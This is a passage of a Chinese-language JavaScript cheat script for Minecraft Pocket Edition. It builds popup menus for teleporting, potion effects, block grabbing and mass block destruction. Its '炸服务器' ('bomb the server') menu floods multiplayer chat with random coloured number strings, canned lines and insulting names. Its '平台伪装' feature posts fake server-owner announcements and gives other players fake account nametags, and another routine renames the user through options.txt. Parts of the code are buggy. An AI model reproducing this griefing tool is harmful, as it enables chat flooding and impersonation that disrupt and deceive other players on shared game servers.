                传送玩家(getPlayerX(), getPlayerY() + 50, getPlayerZ());
            }
        }));
        分隔(layout);
        注释文字(layout, 换("%s遁地", "<b>" + astr[12]), 0).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                传送玩家(getPlayerX(), getPlayerY() - 50, getPlayerZ());
            }
        }));
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 50));
        menu.setHeight(屏幕高度 / 2);
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 0), dip2px(ctx, 20))
    } catch (err) {
        信息框("错误", err)
    }
}


function Menu实用功能() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);

        注释文字(layout, "  实用功能:");
        新增按钮(layout, "快捷方式").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu快捷方式();
            }
        }))
        分隔(layout);

        新增按钮(layout, "启动信息").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                mainmenu.dismiss();
                启动完毕事件();
            }
        }))
        分隔(layout);

        新增按钮(layout, "恐慌").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                for (var i = 0; i < 功能开关.length; i++) {
                    if (功能开关[i] == 真) {
                        if (i != 21 || i != 19) {
                            功能开关[i] == 假;
                        }
                    }
                }
                调试输出("已关闭所有功能？");
            }
        }))
        分隔(layout);

        新增按钮(layout, "调试模式").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[13] == 假) {
                    功能开关[13] = 真;
                    调试输出("调试模式开启")
                } else {
                    功能开关[13] = 假;
                    调试输出("调试模式关闭")
                }
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function Menu休闲娱乐() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);

        注释文字(layout, "  休闲娱乐:");
        新增按钮(layout, "平台伪装").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu平台伪装();
            }
        }))
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function Menu平台伪装() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "  平台伪装:");
        新增按钮(layout, "伪装开关").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[4] == 假) {
                    功能开关[4] = 真;
                    var list = get全部玩家();
                    for (var i = 0; i <= list.length; i++) {
                        添加随机帐号(list[i]);
                    }
                    输出JS消息("平台伪装联机盒子已启动！");
                    输出JS消息("指定玩家事件请看玩家管理！");
                    调试输出("此功能只有你自己可见")
                } else {
                    输出JS消息("你已经开启伪装,若想关闭,退出游戏即可.")
                }
            }
        }))
        分隔(layout);


        新增按钮(layout, "防爆保护").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[4] == 真) {
                    if (功能开关[5] == 假) {
                        功能开关[5] = 真;
                        输出消息("§d房主开启了防爆保护")
                    } else {
                        功能开关[5] = 假;
                        输出消息("§b房主关闭了防爆保护")
                    }
                } else {
                    输出JS消息("你还没有开启伪装！");
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "防火保护").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[4] == 真) {
                    if (功能开关[6] == 假) {
                        功能开关[6] = 真;
                        输出消息("§d房主开启了防火保护")
                    } else {
                        功能开关[6] = 假;
                        输出消息("§b房主关闭了防火保护")
                    }
                } else {
                    输出JS消息("你还没有开启伪装！");
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "设置时间").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[4] == 真) {
                    if (功能开关[7] == 假) {
                        var 几率 = 生成随机数(0, 3);
                        switch (几率) {
                            case 0:
                                输出消息("§d房主设置当前时间为: 00 : 00 : 00");
                                break;
                            case 1:
                                输出消息("§d房主设置当前时间为: 09 : 40 : 26");
                                break;
                            case 2:
                                输出消息("§d房主设置当前时间为: 15 : 32 : 02");
                                break;
                            case 3:
                                输出消息("§d房主设置当前时间为: 09 : 01 : 22");
                                break;
                        }
                    }
                } else {
                    输出JS消息("你还没有开启伪装！");
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "禁用物品").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[4] == 真) {
                    if (功能开关[8] == 假) {
                        功能开关[8] = 真;
                        输出消息("§d房主已禁用 TNT, 岩浆, 水, 火, 隐身药水, 蛋卵, 发射器, 船")
                    } else {
                        功能开关[8] = 假;
                        输出消息("§b房主已解除全部禁用!")
                    }
                } else {
                    输出JS消息("你还没有开启伪装！");
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "禁止部分").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[4] == 真) {
                    if (功能开关[9] == 假) {
                        功能开关[9] = 真;
                        输出消息("§d房主已禁止破坏 告示牌, 箱子, 展示框, 投掷器, 发射器")
                    } else {
                        功能开关[9] = 假;
                        输出消息("§b房主已解除全部禁止破坏方块!")
                    }
                } else {
                    输出JS消息("你还没有开启伪装！");
                }
            }
        }))
        分隔(layout);


        新增按钮(layout, "禁止全部").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[4] == 真) {
                    if (功能开关[10] == 假) {
                        功能开关[10] = 真;
                        输出消息("§d房主已禁止破坏全部")
                    } else {
                        功能开关[10] = 假;
                        输出消息("§b房主已解除全部禁止破坏方块!")
                    }
                } else {
                    输出JS消息("你还没有开启伪装！");
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "禁止更新").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[4] == 真) {
                    if (功能开关[11] == 假) {
                        功能开关[11] = 真;
                        输出消息("§d房主开启了禁止方块更新")
                    } else {
                        功能开关[11] = 假;
                        输出消息("§b房主关闭了禁止方块更新")
                    }
                } else {
                    输出JS消息("你还没有开启伪装！");
                }
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 240), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

var where终末之诗 = 0;

function useItem(x, y, z, itemId, blockId, side, itemDamage, blockDamage) {
    if (功能开关[0] == 真) {
        preventDefault();
        for (var i = 1; i <= 20; i++) {
            破坏方块(x, y + 10 - i, z, 假);
            破坏方块(x + 1, y + 10 - i, z, 假);
            破坏方块(x - 1, y + 10 - i, z, 假);
            破坏方块(x, y + 10 - i, z + 1, 假);
            破坏方块(x, y + 10 - i, z - 1, 假)
        }
    }
    if (功能开关[1] == 真) {
        preventDefault();
        添加物品(blockId, 64, blockDamage);
        输出JS消息("已添加方块到背包")
    }
    if (功能开关[2] == 真) {
        preventDefault();
        for (var i = 1; i <= 20; i++) {
            破坏方块(x, y + 10 - i, z, 假);
        }
    }
    if (功能开关[12] == 真) {
        preventDefault();
        for (var i = 1; i <= 20; i++) {
            破坏方块(x, y + 10 - i, z, 假);
            破坏方块(x + 1, y + 10 - i, z, 假);
            破坏方块(x - 1, y + 10 - i, z, 假);
            破坏方块(x, y + 10 - i, z + 1, 假);
            破坏方块(x, y + 10 - i, z - 1, 假);
        };
        带名字发送消息("Herobrine", 终末之诗[where终末之诗]);
        if (where终末之诗 < 终末之诗.length) {
            where终末之诗++
        } else {
            where终末之诗 = 0
        }
    }
}

function Menu游戏辅助() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);

        注释文字(layout, "  游戏辅助:");
        新增按钮(layout, "生物显血").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[17] == 假) {
                    功能开关[17] = 真;
                    调试输出("生物显血已开启")
                } else {
                    功能开关[17] = 假;
                    调试输出("生物显血已关闭")
                }
            }
        }))
        分隔(layout);
        新增按钮(layout, "我的信息").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                info我();
            }
        }))
        分隔(layout);
        新增按钮(layout, "药效添加").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu添加药效();
            }
        }))
        分隔(layout);
        新增按钮(layout, "高级附魔").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (手中物品() == 0 || 手中物品() == null) {
                    输出JS消息("你手中什么都没有,你想附魔空气?")
                } else {
                    高级附魔()
                    输出JS消息("附魔成功.")
                }
            }
        }))
        分隔(layout);
        新增按钮(layout, "获取方块").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[1] == 假) {
                    功能开关[1] = 真;
                    输出JS消息("点击方块以获取它...")
                } else {
                    功能开关[1] = 假;
                    输出JS消息("已关闭获取方块.")
                }
            }
        }))
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}
var gl = [换("已被服务器%s", astr[21]), "menu.copyright", "disconnectionScreen.serverFull", "§b碎梦者v%s"]
var 药效表 = [MobEffect.absorption, MobEffect.blindness, MobEffect.confusion, MobEffect.damageBoost, MobEffect.damageResistance, MobEffect.digSlowdown, MobEffect.digSpeed, MobEffect.fireResistance, MobEffect.harm, MobEffect.heal, MobEffect.healthBoost, MobEffect.hunger, MobEffect.invisibility, MobEffect.jump, MobEffect.movementSlowdown, MobEffect.movementSpeed, MobEffect.nightVision, MobEffect.poison, MobEffect.regeneration, MobEffect.saturation, MobEffect.waterBreathing, MobEffect.weakness, MobEffect.wither];
var 药效表zh = ["伤害吸收", "失明", "反胃", "力量", "抗性提升", "挖掘疲劳", "急迫", "防火", "瞬间伤害", "瞬间治疗", "生命提升", "饥饿", "隐身", "跳跃提升", "缓慢", "速度", "夜视", "中毒", "生命恢复", "饱和", "水下呼吸", "虚弱", "凋零"];


function Menu添加药效() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "  药效添加:");
        新增按钮(layout, "移除全部").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (玩家是否在游戏中() == 真) {
                    移除所有药水效果(获取玩家实体());
                }
            }
        }));
        分隔(layout);
        注释文字(layout, "  选择要添加的药效:")
        for (var i = 0; i < 药效表.length; i++) {
            eval("新增按钮(layout,\"\"+药效表zh[" + i + "]).setOnClickListener(new android.view.View.OnClickListener({onClick: function(v) {if(玩家是否在游戏中()==真){Entity.addEffect(获取玩家实体(),药效表[" + i + "],666*1200,100,假,假);}}}));分隔(layout);");
        }

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 240), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

//抄袭废物你好

function Menu更多信息() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        分隔(layout);
        注释文字(layout, "熊房团队:");
        新增按钮(layout, "说明").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                信息框(testFor(info信息[0]).replace(fang(), 空) + testFor(info信息[1]).replace(fang(), 空));
            }
        }))
        分隔(layout);

        新增按钮(layout, "团队").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                带名字发送消息(获取玩家名字(获取玩家实体()), info信息[6]);
            }
        }))
        分隔(layout);

        注释文字(layout, "脚本防御:");
        新增按钮(layout, "说明").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                信息框(testFor(info信息[2]).replace(fang(), 空) + testFor(info信息[3]).replace(fang(), 空));
            }
        }))
        分隔(layout);

        新增按钮(layout, "防御").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                发送消息(info信息[7]);
            }
        }))
        分隔(layout);

        注释文字(layout, "关于脚本:");
        新增按钮(layout, "更新").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                信息框(testFor(info信息[4]).replace(fang(), 空) + "\n" + testFor(info信息[5]).replace(fang(), 空));
            }
        }))
        分隔(layout);

        新增按钮(layout, "关于").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                信息框("脚本名称: 碎梦者\n脚本作者: Pvzlight\n脚本版本: %ver\n脚本帐号: %g游戏版本: %k\n启动工具: %q".replace("%ver", JSVer).replace("%q", 包名).replace("%k", 版本).replace("%g", getid()));
            }
        }))

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 200));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}


function Menu首页() {
    功能开关[35] = 真;
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(假);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        分隔(layout);
        新增图片(layout, iVBORw0KGLG);
        if (首页公告 == (undefined || null)) {
            注释文字(layout, "脚本名称: 碎梦者<br>脚本作者: Pvzlight<br>脚本版本: %ver<br>游戏版本: %k<br>启动工具: %q<br>交流群: 579439740<br>%e".replace("%ver", JSVer).replace("%q", 包名).replace("%k", 版本).replace("%e", HTML状态), 2);
        } else {
            注释文字(layout, 首页公告, 2)
        }
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 250));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT | android.view.Gravity.TOP, dip2px(ctx, 0), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu2 = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu2.setFocusable(假);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        新增按钮(layout, "打开菜单").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu2.dismiss();
                menu.dismiss();
                功能开关[35] = 假;
                主菜单();
            }
        }))
        分隔(layout);
        新增按钮(layout, "关闭首页").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu2.dismiss();
                menu.dismiss();
                功能开关[35] = 假;
            }
        }))
        分隔(layout);

        新增按钮(layout, "应用推荐").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                信息框("应用推荐", astr[20]);
            }
        }))
        分隔(layout);

        新增按钮(layout, "更多信息").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu2.dismiss();
                menu.dismiss();
                功能开关[35] = 假;
                主菜单();
                Menu更多信息();
            }
        }))
        分隔(layout);
        新增按钮(layout, "启动信息").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu2.dismiss();
                menu.dismiss();
                功能开关[35] = 假;
                启动完毕事件();
            }
        }))
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu2.setContentView(mlayout);
        menu2.setWidth(dip2px(ctx, 120));
        menu2.setHeight(dip2px(ctx, -1));
        menu2.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu2.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT | android.view.Gravity.TOP, dip2px(ctx, 250), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }

}

function 改名(名) {
    写出文件(sdka + "/games/com.mojang/minecraftpe/options.txt", 读入文件(sdka + "/games/com.mojang/minecraftpe/options.txt").replace(/mp_username:.*/g, "mp_username:" + 名))
}

function 生成七彩数字() {
    return 随机颜色() + 生成随机数(0, 9) + 随机颜色() + 生成随机数(0, 9) + 随机颜色() + 生成随机数(0, 9) + 随机颜色() + 生成随机数(0, 9) + 随机颜色() + 生成随机数(0, 9) + 随机颜色() + 生成随机数(0, 9) + 随机颜色() + 生成随机数(0, 9) + 随机颜色() + 生成随机数(0, 9) + 随机颜色() + 生成随机数(0, 9) + 随机颜色() + 生成随机数(0, 9)
}

function 滑稽铠甲_合体() {
    Entity.addEffect(getPlayerEnt(), 3, 999999, 127, false, false);
    设置游戏模式(1);
    for (i = 0; i < 9; i++) {
        Player.clearInventorySlot(i)
    }
    添加物品(276, 1, 0);
    添加物品(261, 1, 0);
    添加物品(278, 1, 0);
    添加物品(21, 64, 0);
    添加物品(262, 64, 0);
    添加物品(310, 1, 0);
    添加物品(311, 1, 0);
    添加物品(312, 1, 0);
    添加物品(313, 1, 0);
    高级附魔(1);
}

function Menu炸服务器() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);

        注释文字(layout, "  炸服务器:");
        新增按钮(layout, "刷屏功能").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                Menu经典功能();
            }
        }))
        分隔(layout);
        新增按钮(layout, "魔法咖啡").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[30] == 假) {
                    功能开关[30] = 真;
                    调试输出("魔法咖啡已经开启");
                    调试输出("请移动咖啡以执行功能");
                } else {
                    功能开关[30] = 假;
                    调试输出("魔法咖啡已经关闭");
                }
            }
        }))
        分隔(layout);
        新增按钮(layout, "障眼法").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[31] == 假) {
                    功能开关[31] = 真;
                    改名(astr[19][生成随机数(0, 3)] + 生成随机数(10, 99));
                    调试输出("已为你设置障眼法名称");
                    调试输出("再点击一次重启游戏！");
                } else {
                    关闭游戏();
                }
            }
        }))
        分隔(layout);
        新增按钮(layout, "快速注册").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                发送消息(获取玩家名字(获取玩家实体()));
                发送消息("123456789");
                发送消息("123456789");
            }
        }))
        分隔(layout);
        新增按钮(layout, "杀戮光环").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                调试输出("即将被加入");
            }
        }))
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function Menu经典功能() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);

        注释文字(layout, "  炸服务器:");
        新增按钮(layout, "七彩数字").setOnTouchListener(new android.view.View.OnTouchListener({
            onTouch: function(v, e) {
                发送消息(生成七彩数字());
                发送消息(生成七彩数字());
            }
        }))
        分隔(layout);

        新增按钮(layout, "魔法白块").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                别踩白块();
            }
        }));
        分隔(layout);

        新增按钮(layout, "背价值观").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (社会主义核心价值观[13] < 11) {
                    社会主义核心价值观[13]++
                } else {
                    社会主义核心价值观[13] = 0;
                }
                带名字发送消息(获取玩家名字(获取玩家实体()), 社会主义核心价值观[社会主义核心价值观[13]]);
            }
        }))
        分隔(layout);

        新增按钮(layout, "终末之诗").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                带名字发送消息("Herobrine", 终末之诗[where终末之诗]);
                if (where终末之诗 < 终末之诗.length) {
                    where终末之诗++
                } else {
                    where终末之诗 = 0
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "制杖名称").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (次[1] < 小学生名称.length) {
                    次[1]++
                } else {
                    次[1] = 0
                }
                发送消息(小学生名称[次[1]])
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

var message = ["联机盒子外进成功！", "再点击一次重启游戏！", "联机盒子外进失败！", "请检查方法是否正确！", "e§碎梦者Ⅲ碎梦者Ⅲ", "<font color=#FFFF00>★</font>", "<font color=#FFFF00>☆</font>"];

if (包 == 白名单[3]) {
    信息框(astr[16]);
    功能开关[22] = 真;
}

function 随机帐号() {
    return "炸妈盒子online_".偷梁换柱("炸妈", 空) + 生成随机数(100000, 3999999);
}

function 数字帐号() {
    return 生成随机数(1000, 9999999)
};

function 随机帐号生成() {
    var 几率 = 生成随机数(0, 100)
    if (几率 <= 20) {
        return 随机帐号();
    } else if (几率 > 20 && 几率 <= 30) {
        return String(数字帐号());
    } else if (几率 > 30 && 几率 <= 45) {
        if (生成随机数(0, 100) < 30) {
            return 小学生名称[生成随机数(0, 小学生名称.length)] + 生成随机数(0, 99);
        } else return "游客";
    } else if (几率 > 45 && 几率 <= 100) {
        return 小学生名称[生成随机数(0, 小学生名称.length)];
    } else {
        调试输出("出现未知错误")
    }
}

function 添加随机帐号(实体) {
    设置实体铭牌(实体, 获取玩家名字(实体) + " (" + 随机帐号生成() + ")")
}

function Menu神器功能() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);

        注释文字(layout, "  神奇功能:");
        新增按钮(layout, "熊房助手").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu熊房工具();
            }
        }))
        分隔(layout);

        新增按钮(layout, "滑稽模式").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (玩家是否在游戏中() == 真) {
                    滑稽铠甲_合体();
                    输出JS消息("已添加神装,已添加药效,并开启了杀人混淆.");
                    Entity.addEffect(获取玩家实体(), 14, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 5, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 10, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 12, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 16, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 11, 666 * 1200, 100, 假, 假);
                    功能开关[18] = 真;
                } else {
                    调试输出("你还没有进入游戏")
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "熊房模式").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[16] == 假) {
                    功能开关[16] == 真;
                    设置游戏模式(1);
                    Entity.addEffect(获取玩家实体(), 14, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 5, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 10, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 12, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 16, 666 * 1200, 100, 假, 假);
                    Entity.addEffect(获取玩家实体(), 11, 666 * 1200, 100, 假, 假);
                    功能开关[12] = 真;
                    功能开关[0] = 假;
                    功能开关[2] = 真;
                    输出JS消息("已开启反伪装,已添加药效,并开启终末魔指")
                    设置实体铭牌(获取玩家实体(), "碎梦者");
                    发送消息(testFor(astr[24]).偷梁换柱(fang(), 空));
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "十字挖掘机").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[23] == 假) {
                    功能开关[23] = 真;
                    输出JS消息("已开启十字挖掘机.");
                } else {
                    功能开关[23] = 假;
                    输出JS消息("已关闭十字挖掘机.");
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "一字挖掘机").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[24] == 假) {
                    功能开关[24] = 真;
                    输出JS消息("已开启一字挖掘机.");
                } else {
                    功能开关[24] = 假;
                    输出JS消息("已关闭一字挖掘机.");
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "终末魔指").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[12] == 假) {
                    功能开关[0] = 假;
